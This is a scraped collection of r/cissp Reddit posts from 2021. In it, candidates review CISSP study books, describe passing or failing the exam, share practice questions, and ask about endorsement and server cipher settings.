I felt this book was great!  I don't see it recommended here enough.  It's from 2018, so reasonably updated.  I didn't read it through fully, but I could see it being a very competent primary reading source.  I used it mostly for reference to double-check things that didn't make sense in my video studies, or practice questions that confused me.  The only thing really lacking in this book is that the site for redeeming the online practice exams is defunct, so you have to call their support line to get an activation code on their new site.  Not a huge issue as I didn't really use their practice questions, but a noticeable issue.  It's also still smaller than the OSG.  7/10

**11th Hour CISSP by Eric Conrad**    
This book was just ok.  I bought both the physical and Audible versions.  Some people said they used it as a review after going over everything, but I think it's too light for that.  I think it would do well as an introduction book when you're first starting your studies and want to dip your toes into each domain first over the course of 200 pages.  Nothing to really learn much info from, but a good way to understand the general topics you'll be diving into.  5/10

**The Effective CISSP by Wentz Wu**    
This book is designed to be a focus on Domain 1 and 2, with a touch of 3.  For the most part, it does that.  I was expecting it to go into further detail than what I had already learned, but that wasn't really the case.  If you've paid attention in your primary study source, this will mostly just repeat what you've already learned, but that can be nice if it's been a while since you went over these topics.  It does give a good description between various steps and such.  Is the book necessary?  Not really... but if you want to hammer in these particular domains, it's a nice addition if you have time.  7/10

**How To Think Like a Manager by Luke Ahmed**    
I'd definitely recommend this book.  It's cheap, and goes over 25 questions and the thought process you should go through.  Best of all, it goes through a VARIETY of questions you would go through, such as ""pick the best out of a list of potentially correct answers"", ""you can easily eliminate two of these"", ""the actual question is asking you for something that can specifically be answered by only one of these"", etc.  The only issue I had with the book was one question (Q14) that focused on firewall architecture ""tiers"", which is not listed in any textbook, and the only video source I could find was one by Luke, and I still couldn't determine what a ""three-tier 2"" architecture and such were.  I spent a couple hours trying to figure this out, but then all of Certification Station agreed it didn't make any sense, and wouldn't show up in the exam, which it didn't.  8/10

**CISSP Exam Guide Ultimate Edition 2021 by Walter Roberts**    
Look... Stay away from this.  It's useless.  The layout is terrible, it looks like it was typed up in Microsoft Word and printed, it skips over important information, and focuses way too heavily on stupid stuff (we don't need two pages on what Malware is).  When I was going through my CCNA studies, I found a cheap book on Amazon called ""CCNA 200-301 Quick Reference Guide"" that was like $12, and 112 pages.  It included all of the exam objectives with a brief description and notes about each objective, allowing the reader to quickly reference each objective and see if they knew the topic or needed to read more.  I was looking for a cheap book that did something similar... just a quick reference of each topic so I could determine if I've missed something.  This book was not that.  At all.  The only reason it gets any points is because it was cheap.  2/10

    Practice Exams  & Quizzes

I used a ton of practice exams and quiz sources... I used the official ISC2 practice exam book, I used CCCure, I used practice questions from all the textbooks above, I used the new Pocket Prep app (whatever it's called now), Wentz and Adam's Q of the Day, etc.  Certification Station itself is a huge conglomerate of practice questions from various sources, so its hard to tell which one was which.  I wouldn't say I went through thousands of questions like many people here... probably a total of like 500-600.  Like many people here say, the practice exams are not like the real thing.  There may be a question or two that pop in and seem similar, but generally those questions are freebie questions anyways (straight to the point definition-like questions).  What I really aimed to do was identify my weak spots and then study those sections.  For me, the new Pocket Prep app was really useful for this because it gives a readout of your proficiency in each domain so I could see which ones I was lacking, and then go back and review those.

But honestly?  Whatever you're using is probably fine.  Don't be like me and waste a huge amount of time and money trying to find the ""best"" practice exams.  There aren't any, and ISC2 send C&D's to people who create questions too similar to the real thing (like with Wentz).  So you're not going to find perfect practice questions.  Just find something that helps you pinpoint your weak spots, and then review those sections.  The best thing you can do is practice and test your knowledge, so just find something and study.  Try to use a couple resources if you can so you can get a variety.

    In Closing...

The exam was tough.  I'm still surprised I passed, but it's encouraged me to continue my studies.  I wouldn't say I'm wayyy more knowledgeable than I was before I started studying... but that may be because I had a good basepoint.  I certainly learned a few interesting and useful things, and hammered down some stuff that I lightly touched on in other certs.

I plan on taking CISM next since the material is similar.  A lot of people just said to go take a few practice exams and then take the real thing, but I want to read through a bit before taking it, as I still feel like there are some CISSP topics I'm not too familiar with.  After that, I'm hoping to either jump into CySA+ or eJPT... I just feel like I've taken a lot of certifications involving knowledge and procedures, but I still have a huge feeling of Impostor Syndrome, and I don't feel like I have as many practical skills as I'd like.  I was offered a few ""Senior Security Analyst"" positions just minutes after posting that I passed the exam, but I still feel too inexperienced.  So overall I'm trying to find something that can prepare me for a more security-centric job.

2868,p0gh9k,"Passed, 100q","Been seeing a lot of ""Passed!"" posts so thought I'd throw in my experience.

Just took the exam last night and passed at 100 questions at a little over an hour.

The key takeaway I want to pass on to you if you're studying: ***you can do it!***

Personal history: I'm old enough to have 2 kids in college, been doing IT and security since my career started in 1994, and I was a computer science major.  I've been involved in SOC audits, written security policies, and consulted with lots of companies regarding how to secure IT assets properly, including extensive HIPAA consulting.  Branched out and got EnCE forensic certification in 2014 and have been doing forensics and testimony in civil cases since then in addition to the other consulting.  Lots of other certs as well, including the suite of CompTIA and Microsoft. In a word, I have experience, and I know how to take tests.

I'd thought about getting CISSP starting in about 2010 but had put it out of my mind after seeing the commitment it takes to get it, and the Shon Harris book just sat on my shelf for 10 years afterwards.  Plus, I couldn't justify the cert as bringing anything to my resume that I didn't already have.  A colleague of mine wanted CISSP really bad though, so as a challenge I told him I'd go for it too.  We could study together and push each other along.  

2021 was our year, even with the exam being updated.  He is scheduled to take his in October and I've been encouraging him to study more, but life has a way of telling you that your focus needs to be on other things like family and work.  Same applied to me, but I started just giving myself little 10 or 20 question quizzes in between other obligations, or slipping in a Youtube video or a quick read of a few pages.  Eventually the quizzes worked up into 50 questions, and then I took full on 150 question exams.

Resources that are invaluable:

* RELEVANT EXPERIENCE.  This is passable without experience, but if you have worked even tangentially to security, lean on it.
* TEST TAKING. Practice tests count for a TON and gets you in the mindset.  Don't cheat on them.  If you're struggling, make them smaller, even if it's just 1-5 questions.  Get to where you are comfortable and then work your way up.  Whether you miss a question OR EVEN IF YOU GET IT RIGHT, read the explanation and refer back to the books.  Retake missed questions.
* REDDIT. Read your colleagues' experiences, but also be aware that there are some amazing resources here, including the actual authors of study guides and books, and professional trainers.  They don't hide, and don't be afraid to reach out.
* YOUTUBE.  There's so many free videos out there, and many are wonderful at getting the fundamentals ingrained in your mind.

Things I didn't do:

* Read any book cover-to-cover.  I didn't have time or inclination.
* Keep testing myself on subjects I was already familiar with.  For example, I knew I was strong in forensics, but weak in encryption.  So I focused more on encryption until I got comfortable with it.

Specific tools I used to study:

* BOSON.  I will swear up and down that Boson is what got me through this.  They've updated to the 2021 material.  The explanations for answers are top-notch.  By test day I was scoring 95%-100% on full exams.  The only (\*tiny\*) complaint I have about it is that the online version of the test doesn't let you create a custom exam to skip questions you've already answered X number of times, which the local installation does.
* CISSPREP. I hated this test bank with a passion, because it was so hard.  I never broke about 65% on it.  However, its questions really made me think, and were not just rote memorization answers.  I can definitely see the value in the questions it asks, but that doesn't mean I enjoyed taking them.
* ALL IN ONE CISSP EXAM GUIDE, 5th edition.  This one is a carryover from 2010 but was still really helpful, particularly in how security models came to be.  I'd obviously recommend getting the latest edition, but even the older ones still have merit.
* CISSP CBK 2015.   Also older, but still has merit.  Obviously don't seek out an older CBK, but work with what you have, and if someone gifts you older books or you have something in your personal library, don't throw them out.
* Most of all, /u/benmalisow one of the aforementioned authors and trainers active on /r/cissp, who was extremely generous with his time and helpfulness.

As I said above, ***you can do it!***  

It's challenging, yes.  

It's not the hardest test I've ever taken (EnCE was exponentially harder) but I did stop at some questions and just stare at them for a couple of minutes.  Other questions I answered in about 10 seconds.

I'm from Dominican Republic, so mi natural language is Spanish (sorry for my English) and that increases the difficulty level for me in the question reading/understanding, at the point of having to read one single question 5 times.

I took a classroom CISSP course at the beginning of the year and forgot about the exam. 2 weeks ago I decided to take it on and I passed on 1st try :). 

I started my prep with Cybrary free course from Kelly Handerhan which was quite good, but I liked other videos better :)

With that said, the most applicable credential to what I do now is the CISA, but everything I've heard suggests that it's not that challenging for someone with a strong auditing background. My ultimate goal for the next year or two is to get the CISSP, as this sub and other resources suggests it holds the most weight for someone who wants to get into management. However, I don't have a strong background in IT or good study skills, so I'm thinking that taking the Sec+ and Network+ first would make the most sense; the area I'm unfamiliar with is how much those two relate to the CISA.

2885,oxbqfd,Passed my CISSP today,"Hey all,

After an intense 5-day training course and a week of practicing exam questions, I took and passed the CISSP exam. It took me a little over an hour before I got the notification that the test was over. I just wanted to share my experiences for anyone who is planning to take the exam.

As many have already pointed out, the real exam is quite different from the practice exams. That doesn't mean that you'd be wasting your time doing the practice exams though.

In my experience, memorizing the correct answers (from practice exams) will not help you to prepare for the real exam. However, doing the practice exams can help you to read the questions (very) carefully. Sometimes, it takes only one word to completely change the meaning of the question (and subsequently the correct answer to it). When doing practice exams, I noticed that I usually finished them a lot faster than required. This encouraged me to take my time during the real exam.

I found the questions from the real exam to be more varied and less ""gruelling"" than the practice exams. 

One piece of advice I can give you is to really take the time to read and understand the question carefully. You have more than enough time to read it multiple times but once you answer it and move to the next one, you can't go back.

Good luck with your exam!",2021-08-03

2894,owdfw6,Fun CISSP Practice Question,"\*\*Admin(s) Please Delete If Not Helpful\*\*

By the end of 1989, the price of ROM chips was dropping enough that Capcom game designers Akira Nishitani and Akira Yasuda began their ambitious plan for Street Fighter 2. Senior management asked the two designers to stay in-line with the original game and keep it straight forward. Management also asked for a quick turnaround to compete with other upcoming game releases such as Midway’s Mortal Kombat.

While the designers wanted to stay within the confines of the original game structure, they also wanted the freedom to try new things during development with the new ROM chips. Their goal was to create a list of skilled and iconic characters each with their own special abilities. For example, the additional memory space allowed the character Guile to have his Low Kick flipped to look like an upside-down air kick. And as Dhalsim’s limbs started getting longer and longer with each development iteration, it could be counter-balanced by making the character move slower. E. Honda’s flying attack and Chun Li’s Spinning Bird Kick were also newly added memory spaces on the ROM boards. These moves pushed the game from realistic to unrealistic, and added to its charm.

48-bits of data were allocated on the game boards to accommodate these changes.

This resulted in characters slowly increasing their assigned memory while in production and sometimes required a quick fix. In order to make these constant changes, Nishitani and Yasuda needed an accelerated development process with the final end-result already defined, but with the flexibility to allow for improvements while prototyping designs, going back and cutting animation frames for memory conservation, and re-examining system motherboard architecture. The designers needed the ability to constantly build, demonstrate, and refine their game animation changes.

Which of the following software development models would best fit this environment?

A. Waterfall method  
B. Rapid Application Development  
C. Joint Application Development  
D. Spiral Model

CISSPrep Question (not same like exam, don't take these question near to exam. If English is not your first language then it will give you some tough time, but it may improve your thinking skill)

Again, This is my experience, I didn't like the lengthy questions but if it works for you then it is good else don't spend too much time and move on..

2898,ovm35i,Failed today at 150 questions,"Welp...i kinda saw that coming. I felt very unprepared the 2 weeks before the exam. The more i crammed, the less i felt like i knew. Practice tests range from 50-68%, which was discouraging. 

I have a bachelor's in business management (2011) and a masters in information technology systems (2020). I work as a research analyst for a small tech company. My everyday job isn't technical or managerial, but i have done some light technical work here and there for the company the past 9 years I've been there. I thought the test was pretty technical. Especially domain 4, my greatest nemesis. 

Started studying beginning of May. I tried to read the shon harris book, but was overwhelmed (only got through 1/2 book) At the end of may, i took a few practice tests and got around 50%. Only studied about 3hrs on a good day, much less or none on busy days. 

June, used the 11th hour to get to know the domains and then go into detail with videos, research, and shon harris book. Started doing practice test questions every other day. Was feeling better in June.... Then life happened. Didn't study for ~3 weeks. I kept thinking i had time left to study in july. 

July comes and things don't cool downwith life stuff. I was thinking of rescheduling but my mom convinced me to keep my date. It will force me to study, which i agreed with. Didn't get any better. Was only able to study everyday for ~3hr. 

Took a week off work before the exam to cram. That was the bulk of my study time, but even on the week of, i studied 5-6hr. 

I think the practice tests i used were representative of the exam. The sybex practice questions were pretty good, especially in how it is worded. The questions were similar, but the answer choices in the actual exam were more tricky.
They were not as obvious as the practice tests. I was able to narrow questions down to 2 answers. I took too much time in the beginning 50q and didn't have enough time for the rest of the test. Ended up rushing the last bit. 

Knew i failed when the last few questions were straight forward and much easier. Got a lot of legal and regulatory questions that i didn't know because glossed over those in my studies.

Study materials: 
Shon harris all in one CISSP (mostly used to do practice tests. Did ~700q)

11th hour

Sybex 3rd edition practice tests (did ~200 questions. Bought too late in July) 

Destination mind map videos (watched each vid 2x + took notes) 

Cissp cram series (watched each video 2x + followed slides)

Day before exam listed to how to think like a manager by Luke Ahmed and eric conrad's cissp cram session 

My plan for the 2nd time (hopefully last): 
Boot camp. I'm really bad with self study and need some structure. Plus, can tell people in my life i have to go to school for a chunk of time

More practice questions. Want to do all the questions i have

Look for an audio book version of a prep book

I am checking some Linux servers and can see ciphers for basically two: SSL and SSH.

Server host key (rsa, dss) 3. Encryption (ctr, aes, chacha20-poly, cbc etc) 4. Mac-algorithms (hmac-sha2-256). 5 Compression (none)
1.	Could there be ciphers for other services else than SSL and SSH too that needs to be checked?
2.	Getting rid of older and deprecated ciphers (like arcfour, md5) are obvious but what about removing kex algorithm (like Diffie Helman), or Chacha20-poly etc?  Is there a standard list of ciphers for Linux servers, something recommended by NIST or else?

2903,oupqzo,"Passed, 100Q, 75 mins remaining","Hey folks,

Passed the exam today at 100qs and less than 2 hrs. Frankly, did not feel the exam to be too difficult. I was certain about most of the questions.

Studied: Sybex and official questions, Kelly's video on why will you pass the exam, Rob Witcher's Mind Maps, Prashant Mohan's Memory Palace and Think like a Manager.

Studied way too much, exam was in April, had to reschedule due to COVID, since course changed, booked it for July 30th.

My background: 3.5 years of Infosec exp (total experience), mainly into Audits and Risk Management. Have cleared CISA, CISM, CEH, AZ 900, ITIL. Did graduation in Cyber Security.

For those who are preparing, don't spend too much time memorizing tables of cable ratings, wifi speeds etc, be strong conceptually, you'll nail it ;)",2021-07-30

This was my problem. When I sat for the exam last week I got hit by lots of concepts I hadn't even heard of and failed.

Any advice on concepts apart from the official materials I should concentrate on for my re-test? One example - I had studied AWS security roles/functions for cloud but all the cloud related questions were more at an architecture level. I studied but I studied the wrong thing.

2906,ouob9r,Provisionally Passed Yesterday @ 150 Questions,"Hello all. I have been quietly following the CISSP reddit thread for the past two years. Before I get into the journey, I will tell you about my background. I have been in the IT industry for 15 years wearing many hats along the way. I was a managed services network engineer for most of it, although I also worked on systems and security in these roles. I was also an ISO/IT Manager for about four years in the financial industry. I am currently working as a network engineer in the media and broadcast industry. I currently hold CCNP r/S, MCSA/MCSE 2016, A+, Network+ and CISM.

&#x200B;

I have been studying for the CISSP off and on for the last two years. I was hoping to test in early 2020, but the testing centers closed for a while due to COVID. I studied the official study guide (read it cover to cover) and finished the 11th hour by Eric Conrad. This took about two weeks. I tried to read the Shon Harris edition, but I wasn't captivated by the writing style. It felt like reading a dictionary. The official guide was still a hard read, but I was able to keep up with the progression. I also used several practice tests including: the official practice tests, Boson, Shon Harris practice questions and PocketPrep. I would test myself on random questions and when I did poorly, I would review chapter material or concepts.

&#x200B;

After I learned that ISACA allowed online testing, I scheduled my CISM test for May of 2020. Unfortunately, I had technical issues logging into the exam environment so I was not able to take the test. Support did issue me a voucher to retake the exam, but I did not end up taking the exam until April 2021. Not wanting my voucher to expire, I studied the All-In-One study book for the CISM and used the QAE question bank to help (re)prepare. I thought both were essential for passing the CISM exam. I was able to pass the CISM when I took it in April 2021; thankfully I had no technical issues this time. The proctor had me scan the room, under the desk, etc. to ensure a secure test environment at home. It took about two weeks to have my work experience approved, maintenance fees, etc. until I was finally CISM certified.

&#x200B;

I told my employer about my new credentials and my interest in cybersecurity management. They requested I take the CISSP as it was viewed as a harder tested (I'll comment on that later). I ordered the ninth edition of the Official study guide and started my studies with a focused approach on my weak domains. I continued to use my practice tests to focus on these areas. I used PocketPrep and Boson for most of it. When I started using Boson, I was averaging 60-70%. After two months of studying, I was able to bring that up to 80-90% on average. I bought the CCCure questions, but only used them a few times. I heard on this forum that Boson was the best and I agree with that. I finally decided to schedule a date and get it done. I picked 7/29 as my test date and I was a nervous wreck leading up to the exam date. I felt I understudied, unprepared, etc. even though I have been studying hard for the last several months. I read the 11th hour book cover to cover to brush up on my topics. I read this until the late morning on the day of my test. My test was at 2 PM. I also watched the Kelly (Why you will pass the CISSP) video and Larry's videos and they will essential for gaining the right mindset. DON'T FIX ANYTHING!!! Cost benefit analysis for each solution. Management answers are always applicable. Focus on human life.

&#x200B;

I did a few Boson practice questions in the parking to get into the mindset of reading the questions slowly (once, twice), reading the answers slowly (once, twice). All the time to think like a manager, not an engineer. My heart rate was up and I was stressing out. I finally made my way into the testing center for the moment of truth. After the palm scans, NDA and all the processing, I finally started the exam. What I read on this forum was accurate. These were like no questions I have ever seen in my practice test bank. I had a handful that were like that, but most were scenario based. You have to completely understand the concepts and when to use them. I would read the question two or three times, figure out what they were asking and then select the appropriate or best answer. I also proved the other answers were incorrect or less accurate than the answer I chose. Several questions were way out of left field and I used an educated guess to eliminate the wrong answers. After going past 100 questions, I really thought I was headed for failure. I was thinking, all that studying and it is still not enough. I even visualized my next steps, like attending a boot camp. Nevertheless, I continued to answer each question as if it would make or break my passing grade. I finally got to question 150 with about an hour left and clicked finish exam. I was surprised it didn't have a survey like the other exams I have taken.

&#x200B;

I had to go through the checkout process (ID and palm scans again). The proctor verified my name on the printout and I noticed when she was holding it, it did not have bar graphs like I heard similar to a failure report. When she handed it to me, I saw ""Congratulations"" and said aloud, ""Well I wasn't expecting that."" haha I'm so glad I stuck with it and continued to fight for the win. I feel the networking questions pushed me over the top since that is my strongest area. I know I didn't ace it at 100 questions, but I tried my best and that is all that mattered to me. I look forward to the future this certification will bring. If anyone has tips on staying on top of the CE's, I would greatly appreciate it.

&#x200B;

I feel the CISM will help prepare you for the CISSP, but while they are similar, they are also very different. The CISM is more management focused without the high level technical knowledge required for the CISSP. Both exams were very challenging. CISM is paramount if you plan to pursue a Infosec Manager role and analyzing/reporting risk to C-level executives. There is a lot of overlap between the two, but studying for one doesn't necessarily prepare you for the other without additional study.

&#x200B;

Whatever your journey may be, I wish you all the best and I'm happy to answer any questions that do no break the NDA.

Some of the available resources are Thor Pederen's HARD CISSP Practice Questions. So far these are the trickiest and most confusing practice questions I have come across during my prep. Sometimes I feel like they are purposely trying to trick me by using specific words which start to make me over think. I was wondering if anyone else has been using these and if they are also finding them confusing and also wondering how similar these will be to the actual questions I will see. I have provided a sample below.

 ""J**ohn is creating a username for a new employee, Frank Hornsby. The company guidelines recommend the username ""hornsbp1"". The new employee has requested the username ""cowboy"", and there are no accounts with that name. Which username is John most likely to create, and what is the BEST reason?** ""

a. Cowboys because guidelines are optional and cowboy is unique 

b. hornsbpi, because cowboy would be too conspicuous and may attract attackers

c.  hornsbpi, because this format follows the guidelines

d. cowboyl, because this almost follows the guidelines and would not be too conspicuous

2910,oufquj,Provisionally Passed Yesterday!,"I have to honestly say at first, if you’re reading this, you are probably more intelligent than me. Seriously! I just happened to stumble across cybersecurity as I begin to prepare for retirement, and it’s turned into my new passion!

I have no factual background in IT or cybersecurity (I did get SEC+ in March). I’m an active duty Soldier who’s about to retire, and my specialty is in tactical radios and COMSEC. What probably helped me out the most was that I’d been a “manager” for almost 18 years. I do have pretty good knowledge of symmetric and asymmetric keys as a COMSEC manager, but that’s been my experience for the past 20 years.

I passed on my first attempt at 150 questions. I made sure to read everything super slow, and I took the entire three hours.

I used a ton of sources to make up for my experience and lack of knowledge.

Sources I used:

Study Notes and Theory - best overall source for content. The website and Facebook group are phenomenal. 

How to Think Like a Manager by Luke Ahmed - the 25 questions helped me with the manager mindset. Excellent!

Mike Chapple’s LinkedIn course - does a great job of delivering content, then applying it to real-world scenarios 

Sybex 8th & 9th editions 
Sybex Official questions
Shon Harris AIO
Wentz Wu The Effective CISSP
11th-hour study guide
Cissprep.net questions
Destination Certification videos by Rob Witcher
Kelly Handerhan videos
Prabh Nair’s YouTube videos

I used the Pomodoro method for my study routine.

I also used Anki a lot and this subReddit group.

The Sybex content prepared me for the technical part of the exam, the questions on Study Notes and Theory as well as How to Think Like a Manager and CISSPrep.net prepared me for the manager mindset. Mike Chapple’s LinkedIn CISSP class put everything together for me.

Those were my top three resources! But I needed all of them to pass!

My organization paid for an ISC(2) bootcamp and I had a fantastic instructor who provided excellent examples of ""demystifying"" complex subjects like encryption algorithms and frameworks.  I attended the bootcamp last week.

I only used the book as referenced by my bootcamp instructor and then occasionally during the ISC(2) official practice exams to review information that I missed.  I didn't read it cover-to-cover.

I also paid for a month subscription to the PocketPrep app to gain access to all of the questions and just hammered practice questions at night between my bootcamp last week and my exam this morning.

It stopped me at 100q after about 100 minutes.

I think experience had the biggest role in me passing.  I've done most everything covered by the domains, but there's also definitely a ""mindset"" that you have to put yourself in when you take the exam.  It was the same for the CISM.

I am so relieved to have it behind me... and want to encourage those of you that are planning to take it, book the exam now.  Having that ""deadline"" helps with the mental aspect of prepping.  You HAVE to do it if you have an exam appointment.

2922,otq9aj,About a question from the Wiley CISSP test bank...,"Greetings everyone. I attempted the Bonus Exam from Wiley's Test Bank today, and one of the questions asked about a packet analysis scenario.

The questions goes like this:

>While performing network packet capture analysis, you discover packets that seem odd. By looking into the packet’s raw hex display, you see that the byte offset position 0x2F has the value of 0x08. What was this packet attempting to make occur?  
>  
>A. Abruptly disconnect a session  
>  
>B. Confirm the receipt of a data set  
>  
>C. Start a graceful hang-up process  
>  
>D. Initiate a new session connection

I pick A, the answer that this shows a reset, to abruptly end the connection, and Wiley says I'm right. It provides the following explanation which I'll copy and paste here:

>The raw hex value of 0x08 in offset position 0x2F represents the binary number of 00000100. When this binary number is compared to the TCP header flag (i.e., the offset position 0x2F) layout of XXUAPRSF, it is clear the Reset flag is set. Thus, this packet is attempting to abruptly disconnect a session.

This seems strange, because 0x08 is binary 00001000, so the explanation is one position off.

The layout of the control bits is correct, XXUAPRSF, and RST is indeed 00000100. But, that means the hex value should be 0x04 in both the question *and* the answer / explanation.

Furthermore, the offset position for the TCP header flag should be byte offset 13, i.e. TCP\[13\]. Why does it say offset position 0x2F?

It seems as if Wiley made several mistakes here. Either that, or I am losing my mind. Can you guys weigh in?

One last point is that I hardly think questions like this will appear in the actual exam. Packet analysis seems too far down in the weeds. What do you guys think?",2021-07-29

2925,osz1a8,Provisionally passed the CISSP at 100 questions today,"Hello everyone,

&#x200B;

I studied for the exam for maybe 2 days and did a cramming session last night of some quizlet questions, read through eric conrad's 11th hour, reviewed concepts in the official study guide I didn't understand, watched youtube videos, and provisionally passed the exam at 100 questions. Let me start off by saying that I have about 10+ years of experience in InfoSec and most of the success of the exam was really not from the cramming session, but rather my real-world experience. 

&#x200B;

This was by far the weirdest exam I have ever taken. At no time, did I know or feel if I was doing well or not. The questions are worded in a way that many answers could be correct ones and I feel that this is what makes the test **'difficult'** for some. There were a lot of test-taking skills that I applied like the process of elimination and re-reading the question again to ensure I was understanding the question correctly. At the end of the day, I believe my experience and knowledge of infosec acquired over the years is what got me the pass.

&#x200B;

I just want to say you definitely don't want to memorize anything. The cramming session I did overnight was focused on a couple of areas I didn't feel comfortable with and I really just tried learning the concepts. Memorizing will definitely not help you in this test. Definitely need to understand concepts and take the test from the perspective of a 'Risk Consultant'. That really helped me.

&#x200B;

Anyways, I'm happy that I was able to pass and I'm also very thankful for the posts with resources people used to pass the exam that I was able to review the past month. I did use some. 

&#x200B;

Here's my list of resources that I used this week:

\- Eric Conrad's 11th Hour **( Read book overnight and today before exam, its a super quick read and very helpful)**

\- Sybex Official Study Guide **( reviewed only concepts I didn't understand quickly)**

Something had to be done or else the USA was to going to lose the war against its enemies on the cybers fronts. We could beat anyone in physical battle, but how do we beat an enemy who knows no boundaries that you can't shoot or kill by a stealth bomber or a drone?

After being in traffic for hours on 66 East by the Key Bridge near Georgetown, Mr. Bell LaPadula had enough and took the exit near Roslyn to cross the bridge. ""Big mistake"" he explained ""the damn traffic worse up in here!"" After moving an inch every 30 minutes, he remembered why took this exit. He loved the view of the Potomak river, as the sun rose up over Kenndy Center. It was better than looking at a parking lot of cars.

Noticing how late he was running for work, he had no choice but to call his best friend Biba, a goofball who saw Mr. LaPadulla as this big military prick but loved like a brother nonetheless. They have been arguing for days about how to solve these Cybersecurity incidents. His biggest worry was to prevent insider threats, there has been a fear that there are Chinese spies now working in the ranks of the US government, they had found a way to get in and now no one could be trusted, not even our own...

Bell and Biba have been working together with Clark Wilson, an AirForce retire who loved sports cars, more especially Camaros, and their nerdy twin buddies Brewer and Nash who were obsessed with the Great Wall of China, but for some odd reason they always referred to it as Chinese Wall, LaPadulla never asked why... Together they made a great team solving the hardest IT Security problems.

However, Mr. Goguen Mesegur, a kiss-ass who was a title whore in the government world, always got in the way of LaPadulla. No matter how great of an idea he had, Goguen stopped him in order to push his own agenda. His biggest supports were Graham Denning, an IT Manager, and Mrs. Sutherland, an old-school mean lady who smoked way too many cigarettes, the type of person you wondered how she was still alive after smoking packets of cigarettes per day for many many years! If she called, you could even smell the cigarettes from the phone as soon as she said ""hello darling...""

2931,oswpx3,CISSP endorsement questions,"I'm currently studying for my CISSP and have some questions about who can actually endorse me.

I thought I just needed to prove 5 years of experience in the domains covered, I didn't realize that the person endorsing me has to also be ISC certified.

I am part of a two man IT team and would've had my boss endorse me. the scope of my job very much includes security.

However, while I have 5 years of security experience, my boss is not an ISC member. I'm also not particularly looking to jump ship once I'm certified (though id make a lot more money if I did.) How do I get my skills endorsed when I pass the CISSP exam?

Can my boss endorse me without a CISSP himself?

Can I be endorsed by a third party ISC2 member? If so, what will I need to show them to prove my experience?

For example, in the past five years I have:

- earned a CRTP certification

- built and tuned a SIEM solution based on graylog, elasticbeats, sysmon, and graylog sidecar. This system uses SIEM rules translated from the sigma project (to which I am a github contributor)

- developed the incident response plans and playbooks for our organization (a few hundred pages worth)

- planned and implemented CCTV and access control systems for all of our sites...

- ... along with matching surveillance and privacy policies specific to our region (were a govt agency subject to strict privacy laws)

- top 500 member of hackthebox.eu since 2017

- set up and perform monthly vulnerability assessments

- replaced all our firewalls and audited their rules and configurations

- wrote the RFPs for several new projects (including disaster recovery)

- been the primary responder to several ransomware incidents (at my previous job at an MSP)

- Developed security awareness programs for our staff (both knowbe4 and live demos such as demonstrating USB HID attacks to staff)

- formally specialized in infosec during my computer science degree

- write infosec articles in my spare time, several of which have been cited by large organizations including infosecinstitute (not that i like infosecinstitute, but whatever)",2021-07-27

2933,orz3bf,5 Tips For Passing The CISSP Exam,"Thought I’d share some of my top tips for passing the CISSP exam.

**#5 Read and Relate**

“I don’t understand, I read the Shon Harris book 3 times! How did I fail the exam?”

You read The Odyssey.

You read The Old Man and The Sea.

You read To Kill A Mockingbird.

You don’t read a CISSP study guide.  You must relate and understand a CISSP study guide.

Software Development Security was my weakest domain.  I’d turn my computer speakers up, and listen to a 2-hour video about Software Development Security on YouTube or CBT Nuggets.  Then, I’d proceed to forget everything in three days.  I don’t create software for a living, which is why I had a tough time relating the Software Development Life Cycle (SDLC) to the real world.

But I did work in network security for a living.  A job in which I applied cryptography concepts into action through the use of VPNs and SSH every single day.  This is why cryptography became my strongest domain, I had the ability to relate what I read in CISSP study guides.  I’d read about symmetric and asymmetric encryption, and then apply it for customer devices and environments.  It was awesome.

In an effort to increase my knowledge about the SDLC though, I Googled and YouTubed all I could.  I’d Google things like “iphone software development process”, or “SDLC process used by Facebook”.  I’d read about these real world examples to better relate it to the CISSP books.

I found out too late that the CISSP is actually not a memorization test, it’s a test of concepts.  Keep that in mind as you study!

**#4 Obsess**

“I tried to make the game perfection” – Michael Jordan

How do you get good at something? You have to keep doing it over and over again.  If you want to be a good basketball player, you gotta put in hours shooting in the gym, learning how to dribble tighter, run faster, and shoot more accurately.  Michael Jordan obsessed over the game, and went on to become a basketball legend, and accumulate an estimated net worth of $1 BILLION!

Michael Jordan was the totality of all his training.

I remember obsessing so much over the CISSP that sometimes I neglected my friends, family, and general hygiene.  When obsessing, it’s hard to let go.   While driving, going to sleep, or eating, my obsessive subconscious would still think of a problem, and continue to work on it.

Obsession can be dangerous mentally, but with proper control, it can be an effective productivity tool.

Luckily, you can start the obsession phase 2 months before you take the actual exam.  This is the time to sleep, breathe, and eat CISSP.  Just study it everyday right up until the exam so everything stays fresh in your brain.

**#3 Write**

Not type. Not email.  Not text.

Write.

Pencil and paper.

Read about vulnerability testing, and then draw out a network topology map and place the firewalls, IPS, IDS, and servers where they should belong.

Read about system ring architecture, and actually sketch the proper and secure path for a system process.

Read about the OSI Model and actually draw out how a packet starts at the application layer on Host A, and travels up the layer to Host B.

Let the information you read, flow from your brain, through your arms, and to the tip of your pencil.  When you get a question about a packet having issues at the network layer on the exam, your brain will recall back to your hand motion of writing about it on a piece of paper.

**#2 Trust Yourself**

Before actually taking the exam, all I heard was that the CISSP was an incredibly tough exam.  This was in the days of the 250 questions and 6 hours of total mess-with-your-mind torture exam.

This is true.  But I’m here to tell you that it is a completely passable exam! It’s not that difficult.  The only way to do it is to follow the same formula as everyone else who has passed.  Get some real life security experience, study the Shon Harris books, take an ungodly amount of practice exam questions, and mentally prepare yourself to sit in an exam room for a prolonged period of time while being mentally tested.

After completing about 180 questions during the exam, I actually started to feel fairly confident that I will pass.  Before taking the exam, I felt 60% confident that I’d pass, even though I studied for 10 months.  It is only after passing, that I realized I should’ve trusted myself 100%.

I’m trying to boost your confidence now, and not after the exam.  If you study well, you will be a CISSP.  It is not that difficult.

If you understand the concepts, and can truly see the big picture as it relates to information security, and have done your best to study for the exam, then trust yourself.  You will pass.

**#1 Don’t Give Up**

The alarm rings at 8:00 a.m., but it’s your day off.

You came home from a tough week of work, spent time with your family trying to hide your exhaustion, then finally collapsing into bed.

You deserve some rest.

Then your brains reminds you about that alarm you set early in the morning.  You still have an exam to take in 5 weeks.  You may have failed it the first time, but you’re definitely not going to fail it the second time.  You still have to read more about Common Criteria and Spanning Tree Protocol.  You still need to nail down all the steps in a forensic investigation process.

I can tell you not to give up a million times.  I can tell you that dedicating yourself to study for the CISSP is the only way to pass the first time, but it’s ultimately your decision.

Don’t give up.",2021-07-26

